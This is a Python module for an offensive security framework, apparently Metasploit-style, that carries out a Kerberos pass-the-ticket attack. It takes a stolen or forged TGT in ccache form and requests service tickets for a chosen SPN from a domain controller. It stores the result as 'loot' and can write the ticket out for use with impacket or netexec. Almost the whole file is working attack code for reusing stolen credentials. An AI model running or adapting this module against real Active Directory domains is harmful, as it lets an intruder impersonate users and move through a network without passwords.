"""Pass the ticket: put a looted TGT back to work.

golden_ticket (and real ticket theft) loots base64 CCACHE blobs — ticket
plus session key, the pair a TGT is actually usable with. This module
takes one and asks the KDC for a service ticket to TARGET_SPN: the live
proof the TGT is a working credential, and the way to aim a forged TGT
at a concrete service. The resulting service ticket is looted as ccache
too, so chains continue.

OUTFILE writes the INPUT ccache to disk unchanged — that's the convert
helper: `loot` shows the id, copy the base64 into TICKET, set OUTFILE
/tmp/x.ccache, and any KRB5CCNAME-aware tool (impacket's -k -no-pass,
netexec --use-kcache) can use it.

Input handling: ccache blobs are parsed; raw AS-REP/TGS-REP bytes (loot
from before the ccache switch) are recognized but refused — they lack
the session key, re-loot with the current modules. Service-ticket
ccaches (s4u output) can't mint new tickets (only TGTs can) — write
those to OUTFILE and use them directly.

COMPAT: same Heimdal authenticator-cksum fix as kerberoast.py — the
vendored request_tgs here is a copy; keep them in sync.
"""

import base64
import binascii
import datetime
import random

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString

try:
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import (
        AP_REQ,
        AS_REP,
        TGS_REP,
        TGS_REQ,
        Authenticator,
        seq_set,
        seq_set_iter,
    )
    from impacket.krb5.ccache import CCache
    from impacket.krb5.crypto import Cksumtype, make_checksum
    from impacket.krb5.kerberosv5 import sendReceive
    from impacket.krb5.types import KerberosTime, Principal, Ticket
except ImportError:
    constants = None  # console gates run() on requirements

CCACHE_MAGICS = (b"\x05\x04", b"\x05\x03")  # ccache v4 / v3 header
AS_REP_TAG = 0x6B   # [APPLICATION 11]
TGS_REP_TAG = 0x6D  # [APPLICATION 13]


def sniff_ticket(blob):
    """'ccache' | 'as-rep' | 'tgs-rep' | 'unknown' — by leading bytes."""
    if blob[:2] in CCACHE_MAGICS:
        return "ccache"
    if blob[:1] == bytes([AS_REP_TAG]):
        return "as-rep"
    if blob[:1] == bytes([TGS_REP_TAG]):
        return "tgs-rep"
    return "unknown"


def _auth_cksum_type(enctype):
    return {23: Cksumtype.HMAC_MD5, 17: Cksumtype.SHA1_AES128,
            18: Cksumtype.SHA1_AES256}[enctype]


def _strip_explicit_tag(data):
    """Remove a leading [n] EXPLICIT tag wrapper from a DER value."""
    if not data or not 0xA0 <= data[0] <= 0xBF:
        return data
    if data[1] & 0x80:
        return data[2 + (data[1] & 0x7F):]
    return data[2:]


def request_tgs(spn, domain, kdc_host, tgt, cipher, session_key):
    """getKerberosTGS with the authenticator cksum Heimdal KDCs (Samba AD)
    require. Vendored from kerberoast.py — keep in sync. `tgt` is AS-REP
    bytes (a real one, or the synthetic one ccache's toTGT() builds)."""
    decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    domain = domain.upper()
    ticket = Ticket()
    ticket.from_asn1(decoded_tgt["ticket"])

    tgs_req = TGS_REQ()
    tgs_req["pvno"] = 5
    tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    req_body = seq_set(tgs_req, "req-body")
    req_body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.canonicalize.value,
    ])
    seq_set(req_body, "sname", spn.components_to_asn1)
    req_body["realm"] = domain
    now = datetime.datetime.now(datetime.timezone.utc)
    req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["rtime"] = KerberosTime.to_asn1(now)
    req_body["nonce"] = random.getrandbits(31)
    seq_set_iter(req_body, "etype", (
        int(constants.EncryptionTypes.rc4_hmac.value),
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
    ))
    req_body_bytes = _strip_explicit_tag(encoder.encode(req_body))

    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = decoded_tgt["crealm"].asOctets()
    client_name = Principal()
    client_name.from_asn1(decoded_tgt, "crealm", "cname")
    seq_set(authenticator, "cname", client_name.components_to_asn1)

    def _fill_cksum(component):
        component["cksumtype"] = _auth_cksum_type(cipher.enctype)
        component["checksum"] = make_checksum(component["cksumtype"],
                                              session_key, 6, req_body_bytes)
        return component

    seq_set(authenticator, "cksum", _fill_cksum)
    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)
    encoded_auth = encoder.encode(authenticator)

    ap_req = AP_REQ()
    ap_req["pvno"] = 5
    ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    ap_req["ap-options"] = constants.encodeFlags([])
    seq_set(ap_req, "ticket", ticket.to_asn1)
    ap_req["authenticator"] = noValue
    ap_req["authenticator"]["etype"] = cipher.enctype
    ap_req["authenticator"]["cipher"] = cipher.encrypt(session_key, 7,
                                                     encoded_auth, None)
    tgs_req["padata"] = noValue
    tgs_req["padata"][0] = noValue
    tgs_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)
    return sendReceive(encoder.encode(tgs_req), domain, kdc_host)


class PassTheTicket(AuxiliaryModule):
    name = "Pass the Ticket (ccache -> service ticket)"
    description = """
        Takes a base64 CCACHE ticket (golden_ticket / s4u loot, or theft)
        and requests a service ticket to TARGET_SPN from the KDC — proof
        and use of a TGT without any password. The new ticket is looted
        as ccache as well. Set OUTFILE to also write the INPUT ticket to
        disk as a .ccache for KRB5CCNAME-aware tools (the convert path:
        loot -> base64 -> file).
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller / KDC"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("TICKET", required=True,
                                   description="Base64 ccache blob (from loot)"))
        self.options.add(OptString("TARGET_SPN", default="",
                                   description="SPN to request with the TGT, e.g. "
                                               "HTTP/api.forge.local"))
        self.options.add(OptString("OUTFILE", default="",
                                   description="Write the input ticket here as "
                                               ".ccache (for KRB5CCNAME tools)"))

    def run(self):
        domain = str(self.get_option("DOMAIN"))
        raw_option = str(self.get_option("TICKET") or "").strip()
        try:
            blob = base64.b64decode(raw_option, validate=True)
        except (binascii.Error, ValueError):
            self.print_error("TICKET is not valid base64")
            return
        kind = sniff_ticket(blob)
        if kind in ("as-rep", "tgs-rep"):
            self.print_error(
                f"raw {kind} bytes carry no session key — unusable. "
                f"Re-loot with the current modules (ccache format)")
            return
        if kind == "unknown":
            self.print_error("unrecognized ticket format (not ccache, "
                             "AS-REP, or TGS-REP)")
            return

        try:
            ccache = CCache(blob)
        except Exception as e:
            self.print_error(f"ccache parse failed - {e}")
            return
        if not ccache.credentials:
            self.print_error("ccache holds no credentials")
            return
        cred = ccache.credentials[0]
        server = "/".join(c["data"].decode("utf-8", "replace")
                          for c in cred["server"].components)
        client = "/".join(c["data"].decode("utf-8", "replace")
                          for c in cred["client"].components)

        outfile = str(self.get_option("OUTFILE") or "").strip()
        if outfile:
            try:
                with open(outfile, "wb") as f:
                    f.write(blob)
                self.print_good(f"input ticket written to {outfile} "
                                f"(KRB5CCNAME={outfile})")
            except OSError as e:
                self.print_error(f"cannot write {outfile} - {e}")

        if not server.lower().startswith("krbtgt/"):
            self.print_warning(f"{client} -> {server}: a service ticket, "
                               f"not a TGT — it can't mint new tickets. "
                               f"Use it directly (OUTFILE).")
            return

        target_spn = str(self.get_option("TARGET_SPN") or "").strip()
        if not target_spn:
            self.print_status(f"TGT for {client} is loadable; set "
                              f"TARGET_SPN to request a service ticket")
            return

        tgt = cred.toTGT()
        host = str(self.get_option("RHOSTS")).split(",")[0].strip()
        spn = Principal(target_spn,
                        type=constants.PrincipalNameType.NT_SRV_INST.value)
        self.print_status(f"{host}: TGT for {client} loaded; requesting "
                          f"{target_spn}")
        try:
            tgs = request_tgs(spn, domain, host, tgt["KDC_REP"],
                              tgt["cipher"], tgt["sessionKey"])
        except Exception as e:
            self.print_error(f"{host}: KDC refused the TGT - {e}")
            return
        tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        cname = "/".join(str(c) for c in tgs_rep["cname"]["name-string"])
        sname = "/".join(str(c) for c in tgs_rep["ticket"]["sname"]["name-string"])
        self.print_good(f"{host}: KDC issued {cname} -> {sname} — "
                        f"the ticket is a live credential")

        store = getattr(self.framework, "store", None)
        if store is not None:
            out_ccache = CCache()
            out_ccache.fromTGS(tgs, tgt["sessionKey"], tgt["sessionKey"])
            store.add_loot("ticket", f"ptt {cname} -> {sname} @ {domain}",
                           base64.b64encode(out_ccache.getData()).decode(),
                           address=host)
            self.print_status("Service ticket saved as loot (base64 ccache)")
